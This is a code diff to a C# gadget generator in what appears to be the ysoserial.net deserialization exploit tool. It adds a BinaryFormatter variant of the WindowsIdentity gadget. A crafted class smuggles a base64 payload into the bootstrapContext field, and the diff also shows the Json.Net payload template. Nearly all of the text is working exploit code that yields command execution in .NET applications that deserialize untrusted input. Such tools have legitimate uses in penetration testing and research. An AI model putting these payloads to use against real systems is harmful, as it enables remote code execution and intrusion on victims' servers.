@@ -2,6 +2,8 @@
 using System.Collections.Generic;
 using System.IO;
 using System.Runtime.Serialization;
+using System.Security.Claims;
+using System.Security.Principal;
 using System.Xml;
 using Newtonsoft.Json;
 
@@ -30,12 +32,29 @@ namespace ysoserial.Generators
 
         public override List<string> SupportedFormatters()
         {
-            return new List<string> { "Json.Net", "DataContractSerializer" };
+            return new List<string> { "BinaryFormatter", "Json.Net", "DataContractSerializer" };
         }
 
         public override string Name()
         {
             return "WindowsIdentity";
+        }
+
+        [Serializable]
+        public class IdentityMarshal : ISerializable
+        {
+            public IdentityMarshal(string b64payload)
+            {
+                B64Payload = b64payload;
+            }
+
+            private string B64Payload { get; }
+
+            public void GetObjectData(SerializationInfo info, StreamingContext context)
+            {
+                info.SetType(typeof(WindowsIdentity));
+                info.AddValue("System.Security.ClaimsIdentity.bootstrapContext", B64Payload);
+            }
         }
 
         public override object Generate(string cmd, string formatter, Boolean test)
@@ -44,13 +63,18 @@ namespace ysoserial.Generators
             byte[] binaryFormatterPayload = (byte[])binaryFormatterGenerator.Generate(cmd, "BinaryFormatter", false);
             string b64encoded = Convert.ToBase64String(binaryFormatterPayload);
 
-            if (formatter.ToLower().Equals("json.net"))
+            if (formatter.Equals("binaryformatter", StringComparison.OrdinalIgnoreCase))
+            {
+                var obj = new IdentityMarshal(b64encoded);
+                return Serialize(obj, formatter, test);
+            }
+            else if (formatter.ToLower().Equals("json.net"))
             {
                 string payload = @"{
                     '$type': 'System.Security.Principal.WindowsIdentity, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
                     'System.Security.ClaimsIdentity.bootstrapContext': '" + b64encoded + @"'
                 }";
-                
+
                 if (test)
                 {
                     try
